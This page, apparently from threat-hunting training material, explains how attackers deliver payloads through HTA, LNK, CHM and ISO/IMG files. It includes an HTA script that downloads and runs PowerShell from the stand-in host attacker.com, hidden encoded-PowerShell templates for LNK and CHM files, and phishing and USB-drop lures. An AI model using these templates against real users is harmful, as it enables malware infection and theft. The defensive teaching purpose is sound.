---
showTableOfContents: true
title: "Alternative Delivery Mechanisms"
type: "page"
---



Beyond traditional documents, attackers use various file types to deliver payloads.

## HTML Applications (HTA)

**What Is HTA?** HTML Application files (`.hta`) are HTML files that run with full trust outside the browser's security sandbox, executed by `mshta.exe`.

**Why Attackers Love HTAs:**

- Full access to Windows Scripting Host
- Can execute VBScript, JScript
- Runs with user's privileges
- Often delivered via phishing links

**Example HTA Structure:**

```html
<html>
<head>
<HTA:APPLICATION id="oHTA" applicationName="Document Viewer" border="thin" 
borderStyle="normal" caption="yes" maximizeButton="no" minimizeButton="no" 
showInTaskbar="no" windowState="normal" innerBorder="yes" scroll="no" />

<script language="VBScript">
Sub Window_OnLoad
    Set objShell = CreateObject("WScript.Shell")
    
    ' Download and execute payload
    objShell.Run "powershell.exe -NoP -sta -NonI -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')""", 0
    
    ' Close the HTA window
    window.close()
End Sub
</script>
</head>
<body>
<p>Loading document, please wait...</p>
</body>
</html>
```

**Attack Delivery:**

1. Email with link: "View your secure document here"
2. User clicks link
3. Browser downloads `.hta` file
4. User executes (often thinking it's a document)
5. `mshta.exe` runs the script
6. Payload executes, window closes
7. User sees nothing suspicious

## Windows Shortcut Files (LNK)

**What Are LNK Files?** `.lnk` files are Windows shortcuts. They can execute commands with custom icons, making them perfect for social engineering.

**How LNK Weaponization Works:**

An LNK file can:

- Display any icon (document, folder, PDF)
- Execute arbitrary commands
- Hide the actual target from casual inspection

**Example LNK Configuration:**

```
Target: C:\Windows\System32\cmd.exe /c powershell.exe -w hidden -enc <BASE64_PAYLOAD>
Icon: C:\Windows\System32\shell32.dll,1 (looks like a document)
Start in: C:\Users\Public\Documents
```

**Delivery Scenarios:**

1. **ZIP Archives**:

    - Email: "Invoice.zip"
    - Contains: "Invoice.pdf.lnk"
    - User extracts and double-clicks
    - Expects PDF, gets payload execution
2. **USB Drops** (physical attacks):

    - USB with "Company_Salaries.xlsx.lnk"
    - Employee finds USB, plugs in out of curiosity
    - Opens "spreadsheet", executes payload

**Why They're Effective:**

- Windows hides `.lnk` extension by default
- Users see the icon and assume file type
- Double-clicking is instinctive

## Compiled HTML Help (CHM)

**What Are CHM Files?** `.chm` files are Microsoft's Compiled HTML Help format. They're legitimate help file containers that can execute scripts.

**Weaponization Method:**

CHM files can contain:

- HTML pages
- JavaScript/VBScript
- Active content that runs when the file opens

**Example Attack Structure:**

Inside a CHM file, you might have:

```html
<html>
<head>
<script language="JavaScript">
var command = 'powershell.exe -w hidden -enc <BASE64_PAYLOAD>';
var shell = new ActiveXObject("WScript.Shell");
shell.Run(command, 0);
window.close();
</script>
</head>
<body>
<h1>Loading Help Documentation...</h1>
</body>
</html>
```

**Creation Process:** Attackers use tools like HTML Help Workshop or custom scripts to compile malicious CHM files.

**Delivery:**

- "Technical_Documentation.chm"
- "Employee_Handbook.chm"
- "Software_Manual.chm"

Users trust help files and readily open them.

## ISO and IMG Files

**Recent Trend:** With Microsoft blocking macros from internet-downloaded files, attackers shifted to ISO/IMG files (disk images).

**Why ISO/IMG Files?**

1. **Bypass Mark-of-the-Web (MotW)**:

    - Files inside ISOs don't inherit the MotW flag
    - Macros and executables run without warnings
2. **Appears Legitimate**:

    - Can mount automatically on Windows 10+
    - Contains multiple files (looks like software distribution)
3. **Detection Gaps**:

    - Security tools often don't scan inside disk images
    - Email gateways may not inspect them

**Typical ISO Contents:**

```
Software_Setup.iso/
├── Setup.exe (malicious)
├── ReadMe.txt (legitimate-looking)
├── install.bat (executes payload)
└── Documentation.pdf.lnk (LNK trick inside ISO)
```






---

[//]: # ([|TOC|]&#40;{{< ref "../../../thrunt/_index.md" >}}&#41;)

[//]: # ([|NEXT|]&#40;{{< ref "./02_history.md" >}}&#41;)

